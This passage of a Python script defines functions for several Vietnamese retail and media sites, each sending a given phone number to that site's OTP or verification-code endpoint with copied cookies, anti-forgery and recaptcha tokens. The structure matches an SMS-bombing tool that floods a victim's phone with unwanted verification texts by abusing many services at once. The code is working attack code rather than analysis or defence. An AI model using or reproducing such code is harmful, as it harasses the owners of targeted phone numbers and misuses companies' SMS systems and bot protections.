    'phone': phone,
    'recaptcha': '03AFcWeA7V0fF9KLysGE09G-0Fag-O2opS_ff94uTfPmlChemPUhczRQDN1uzlvQv0k4gIi_DYyje2EX-KU2DLoOOwZYAVkQfGxRdIiMGJJ5WVIy9vs3mWK98WQ1CM85O-Rruw6fEDVsAmh42f2go2zyzYCFyGpvzrBi-Ph6HeGBl2KglwSzPRR46PCTkDFCFzR1XQWEwKCQlBKIbeH0HVcZ3TEM-sJlKBm0lzianSCO748vzKkDrAWYob9efIjDD83QMGazsFhn4kswTDTP7fF8dv1ZQpsLZet-t7yQQR71ZTHcskX09bdAEgHy6Tl7GHpJY3vM7LqPXjPt1kzNTg0f3smeLHZq-ZfWLXdcSuTgoyAbFqq9HLuCAEqk3cN3bLtT2E0QGgDC6XEgvtZyLslfBFOtrctqexbrYz1G9l2ZS--TSOcHJ8d7GPHVNvZxQMHrgSwNhI17k15-qhwRo9JfOlK_VZsi2tI6QSjvfQC0PsKoPqOEGWQsb9x0K-bEQeTBMar3D7Dqvv38-I1N709sHl2WytBuaEmzIagoi2vmF6ou3HFG_uZBmwoFfJS35jivrqNSAHolpslFnfCSNNj0bNFfYSS6yifWFD_xoScBiBP9Dw5grTA0q0WwQV63pign1i2y7YaH0zDZvGgMQyb2tleAxbKwacHiDPgiGZwMpxRwbukt-FkbYkkLSbEnE1XNmrXlP9La5uvB06eVC9D6klEIbboVbeQC1tRol3GZ4GG0oZRRNFOsK3d4oFa4MHletOjrbpnZwgwg_r3fBrYNk13oive0EvUuWS52-5tl8kUUuhUP8mr49qC7v9sgG1cc9dRnfpLip_HZ8YuPLmZiXWb5PWh3EZeEmiEerszzqp47wNP8yVzrRWzW-Jt6yptAaXg1cRqTS3I_xGB0WAHq_0V91bXbvBT9YqiMKxIiVuuZkCMLkhp8nYHBAFP8jgS-ZNY38J3Ms3yDnI-is2OzqKi0iwY_Oaoq33kGZjdA7jHnBa7UUZfHWxLDp_WLBq5npUNs6hl8dNxKp6q53e1y7j-I16aQAcvVKtWAc6URmAGlYWr-C4Zpy00Cfz99QfmUCflVp8RnD5mI_fiMdLgaIfd-mWyJsz33sETslg9g45AsyGTdHWisqvMOPUYH-uHDfnGBU5MsgeMS-IzTTYVi3FNECy8fO10Skhx0DCgnpK_EZH7UhH-v5xBpdfgxBkXnMKPBvAquMi3gViTp6Nw0gezQvQ3yew14vScrmGmb4qKMXMh2-u-ynNLm-0XU64A_aLy7vd4VZz56oydZI3ddNmUZ-ea-cQgP-sY1fnhwkrg-nBdOVTlX8ZFPEuc65kNYacHoFg2Qnxffp0PUSDvLPuxVv84mMx10U4k0DqJOhOM8scg0JT4vyFDeYNT517uioCjdC4zYrJfDET7yxI5-6wiAzdIA3hb7MsJQCfoI5BWRqSyom7zjYdkbR1sZoZJdRHzYOX6UbR81DNp-yOI8gJIWyUYpxb_UEMFAit22Z1jFZxLx0vr-WecEuzXxkQn0_D8xRYks-UcMfWCy-c_HRTUkbBONbkNzscIubIgQhIpZLtcxYvA4UAHYv9OEpvgq76PXksjU_MSKx_a-FqUypF0704KhkSfkI7ryn0VyR2jys0e-VjmUkNCjVPka95pWhn5w_EqUHx4RXMj8au4IgiE9fvwPQgn_67J79b98jFe7xv2V7eDUXACv0EhGp5iWvH0JVhbwsjOb9GGXgniSdWEBC2CZv78-PtZtKKKflVbn13jY02oT6a4o6WOiV57lpnvFn6YA-EjnZHWElqwshVISKZqM1skHgl3UCryRPi8lefJDzAIq1L5QgjRpC7RvJbjOe0icqS_k3poH23GrUYWrA89e1_4yoHAaybjQT9znTEeaH9Fao',
    'version': 'v3',
    'voice': True,
    'method': 'sms',
}

   response = requests.post(
    'https://api-gateway.pharmacity.vn/pmc-ecm-auth-api/api/authenticator/customer/register/otp',
    headers=headers,
    json=json_data,
)
def mocha(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'msisdn': phone,
    'languageCode': 'vi',
}

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)

##
def fptshop(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://fptshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fptshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'fromSys': 'WEBKHICT',
    'otpType': '0',
    'phoneNumber': phone,
}

    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)

#####
###

####
def meta(phone):
    cookies = {
    '_ssid': 'vhs1wox2wourjpxsr55hygiu',
    '_cart_': '50568886-ac95-4d4b-b7e3-7819d23d7e44',
    '_gcl_au': '1.1.1853648441.1720104054',
    '__ckmid': '533492a097c04aa18d6dc2d81118d705',
    '_gid': 'GA1.2.95221250.1720104055',
    '_gat_UA-1035222-8': '1',
    '_ga': 'GA1.1.172471248.1720104055',
    '.mlc': 'eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=',
    '_clck': 'lpzudx%7C2%7Cfn6%7C0%7C1646',
    '_clsk': '1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect',
    '_ga_YE9QV6GZ0S': 'GS1.1.1720104062.1.1.1720104068.0.0.0',
    '_ga_L0FCVV58XQ': 'GS1.1.1720104056.1.1.1720104070.46.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '_ssid=vhs1wox2wourjpxsr55hygiu; _cart_=50568886-ac95-4d4b-b7e3-7819d23d7e44; _gcl_au=1.1.1853648441.1720104054; __ckmid=533492a097c04aa18d6dc2d81118d705; _gid=GA1.2.95221250.1720104055; _gat_UA-1035222-8=1; _ga=GA1.1.172471248.1720104055; .mlc=eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=; _clck=lpzudx%7C2%7Cfn6%7C0%7C1646; _clsk=1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect; _ga_YE9QV6GZ0S=GS1.1.1720104062.1.1.1720104068.0.0.0; _ga_L0FCVV58XQ=GS1.1.1720104056.1.1.1720104070.46.0.0',
    'origin': 'https://meta.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://meta.vn/account/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    params = {
    'api_mode': '1',
}

    json_data = {
    'api_args': {
        'lgUser': phone,
        'type': 'phone',
    },
    'api_method': 'CheckRegister',
}

    response = requests.post(
    'https://meta.vn/app_scripts/pages/AccountReact.aspx',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)

###
def blu(phone):
    cookies = {
    'DMX_View': 'DESKTOP',
    'DMX_Personal': '%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d',
    '_gcl_au': '1.1.804133484.1690973397',
    '_gid': 'GA1.2.1071358409.1690973397',
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.8.8977': 'c624660949009f11.1690973398.',
    '_pk_ses.8.8977': '1',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1',
    'cebs': '1',
    '_ce.s': 'v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116',
    '_fbp': 'fb.1.1690973400267.315266557',
    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0',
    'lhc_per': 'vid|c3330ef02699a3239f3d',
    '_gat_UA-38936689-1': '1',
    '_ga_Y7SWKJEHCE': 'GS1.1.1690973397.1.1.1690973847.59.0.0',
    '_ga': 'GA1.1.1906131468.1690973397',
    'SvID': 'dmxcart2737|ZMo2n|ZMo01',
    'cebsp_': '2',
}

    headers = {
    'authority': 'www.dienmayxanh.com',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d; _gcl_au=1.1.804133484.1690973397; _gid=GA1.2.1071358409.1690973397; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=c624660949009f11.1690973398.; _pk_ses.8.8977=1; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1; cebs=1; _ce.s=v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116; _fbp=fb.1.1690973400267.315266557; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU; _ce.clock_event=1; _ce.clock_data=-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0; lhc_per=vid|c3330ef02699a3239f3d; _gat_UA-38936689-1=1; _ga_Y7SWKJEHCE=GS1.1.1690973397.1.1.1690973847.59.0.0; _ga=GA1.1.1906131468.1690973397; SvID=dmxcart2737|ZMo2n|ZMo01; cebsp_=2',
    'origin': 'https://www.dienmayxanh.com',
    'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvIRzWBz3HYz5v5BqsZBR9c1E2ww7q_1JGohDXjcRDM1kdeAbuyRu9P0s0XFTPbkk43itS19oUg6iD6CroYe4kX3wq5d8C1R5pfyfCr1uXg2ZI5cgkU7CkZOa4xBIZIW_k0',
}

    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)

  ###
def tgdt(phone):
    cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_gcl_au': '1.1.1121422736.1720077126',
    '_ga': 'GA1.1.304095547.1720077127',
    '_pk_id.8.8977': 'f4065ec429abd1e2.1720077127.',
    '_ce.clock_data': '-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    '_fbp': 'fb.1.1720077128189.217218927440922861',
    'TBMCookie_3209819802479625248': '350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.8.8977': '1',
    'SvID': 'new2688|Zoaz1|Zoaz0',
    '_ce.irv': 'returning',
    'cebs': '1',
    '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI',
    'cebsp_': '2',
    '_ga_Y7SWKJEHCE': 'GS1.1.1720103888.2.1.1720103890.58.0.0',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1',
    '_ce.s': 'v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1121422736.1720077126; _ga=GA1.1.304095547.1720077127; _pk_id.8.8977=f4065ec429abd1e2.1720077127.; _ce.clock_data=-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; _fbp=fb.1.1720077128189.217218927440922861; TBMCookie_3209819802479625248=350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.8.8977=1; SvID=new2688|Zoaz1|Zoaz0; _ce.irv=returning; cebs=1; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI; cebsp_=2; _ga_Y7SWKJEHCE=GS1.1.1720103888.2.1.1720103890.58.0.0; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1; _ce.s=v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476",
    'Origin': 'https://www.dienmayxanh.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Twguyex9_cgh9XeukD7bUARFjQSniZ-oK2sROjdYE3ySLrvJztUU-tZn-ZBnL8wqLJjlGTji6qBtWGJDVYPGVt0U3RgoB0Q2Grd4i24dkz4TUIRjXBHguoShv3oZjAt2s',
}

    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)

        ###
def concung(phone):
    cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_pk_id.7.8f7e': '26368263202a729d.1690741327.',
    '_fbp': 'fb.1.1690741326923.344831016',
    '_tt_enable_cookie': '1',
    '_ttp': '4ISzilNrZxHb4rxPiS6GakGBcBl',
    'TBMCookie_3209819802479625248': '256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_gcl_au': '1.1.584652992.1720103764',
    'SvID': 'beline2685|ZoazW|ZoazV',
    '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.7.8f7e': '1',
    '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs',
    '_ga': 'GA1.2.1745564613.1690741327',
    '_gid': 'GA1.2.530012217.1720103766',
    '_gat': '1',
    '_ce.irv': 'returning',
    'cebs': '1',
    '_ga_TZK5WPYMMS': 'GS1.2.1720103766.6.0.1720103766.60.0.0',
    '_ga_TLRZMSX5ME': 'GS1.1.1720103764.33.1.1720103766.58.0.0',
    '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1',
    '_ce.clock_data': '-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    'cebsp_': '1',
    '_ce.s': 'v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _pk_id.7.8f7e=26368263202a729d.1690741327.; _fbp=fb.1.1690741326923.344831016; _tt_enable_cookie=1; _ttp=4ISzilNrZxHb4rxPiS6GakGBcBl; TBMCookie_3209819802479625248=256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.584652992.1720103764; SvID=beline2685|ZoazW|ZoazV; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.7.8f7e=1; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs; _ga=GA1.2.1745564613.1690741327; _gid=GA1.2.530012217.1720103766; _gat=1; _ce.irv=returning; 